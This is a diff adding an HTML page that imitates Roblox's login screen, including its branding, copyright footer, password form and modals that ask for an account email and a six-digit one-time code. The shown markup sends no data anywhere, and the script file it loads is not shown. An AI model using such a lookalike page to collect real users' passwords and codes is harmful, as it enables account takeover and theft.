@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login to Roblox</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <header class="header">
+            <div class="header-left">
+                <div class="logo">
+                    <img src="imgs/icons8-roblox-150.svg" alt="Roblox">
+                </div>
+                <nav class="nav">
+                    <a href="#">Charts</a>
+                    <a href="#">Marketplace</a>
+                    <a href="#">Create</a>
+                    <a href="#">Robux</a>
+                </nav>
+                <div class="search-bar">
+                    <svg class="search-icon" viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M11.742 10.344a6.5 6.5 0 1 0-1.397 1.398h-.001c.03.04.062.078.098.115l3.85 3.85a1 1 0 0 0 1.415-1.414l-3.85-3.85a1.007 1.007 0 0 0-.115-.1zM12 6.5a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0z"/>
+                    </svg>
+                    <input type="text" placeholder="Search">
+                </div>
+            </div>
+            <div class="header-right">
+                <button class="signup-btn">Sign Up</button>
+            </div>
+        </header>
+
+        <main class="main-content login-page">
+            <div class="login-box">
+                <h1>Login to Roblox</h1>
+                
+                <form class="login-form">
+                    <div class="input-group">
+                        <input type="text" placeholder="Username/Email/Phone" required>
+                    </div>
+                    
+                    <div class="input-group">
+                        <input type="password" placeholder="Password" required>
+                    </div>
+                    
+                    <button type="submit" class="login-btn">Log In</button>
+                    
+                    <a href="#" class="forgot-link">Forgot Password or Username?</a>
+                </form>
+
+                <div class="divider">
+                    <span>or</span>
+                </div>
+
+                <button class="one-time-code-btn">
+                    <span class="icon">✉</span>
+                    Email Me a One-Time Code
+                </button>
+
+                <button class="quick-signin-btn">
+                    <span class="icon">⚡</span>
+                    Quick Sign-in
+                </button>
+
+                <div class="signup-section">
+                    <p>Don't have an account? <a href="#">Sign Up</a></p>
+                </div>
+            </div>
+        </main>
+
+        <footer class="footer">
+            <div class="footer-links">
+                <a href="#">About Us</a>
+                <a href="#">Jobs</a>
+                <a href="#">Blog</a>
+                <a href="#">Parents</a>
+                <a href="#">Buy Gift Cards</a>
+                <a href="#">Help</a>
+                <a href="#">Terms</a>
+                <a href="#">Accessibility</a>
+                <a href="#">Privacy</a>
+                <a href="#">Sitemap</a>
+            </div>
+            <div class="footer-copyright">
+                <p>©2026 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.</p>
+            </div>
+        </footer>
+    </div>
+
+    <!-- Email Verification Modal -->
+    <div class="modal-overlay" id="emailVerificationModal">
+        <div class="modal-box">
+            <button class="modal-close-btn" onclick="closeEmailModal()">✕</button>
+            <h2 class="modal-title">Get One-Time Code</h2>
+            <p class="modal-description">Enter the email verified on your account to receive a one-time code.</p>
+            <input type="email" id="verificationEmail" class="modal-email-input" placeholder="Email">
+            <button class="modal-send-btn" onclick="sendVerificationCode()">Send Code</button>
+        </div>
+    </div>
+
+    <!-- Code Entry Modal -->
+    <div class="modal-overlay" id="codeEntryModal">
+        <div class="modal-box">
+            <button class="modal-close-btn" onclick="closeCodeModal()">✕</button>
+            <h2 class="modal-title">Get One-Time Code</h2>
+            <p class="modal-description" id="codeModalDescription">Enter the code we just sent to: <span id="userEmail"></span></p>
+            <input type="text" id="verificationCode" class="modal-email-input" placeholder="6-Digit Code" maxlength="6">
+            <button class="modal-send-btn" onclick="submitVerificationCode()">Verify</button>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
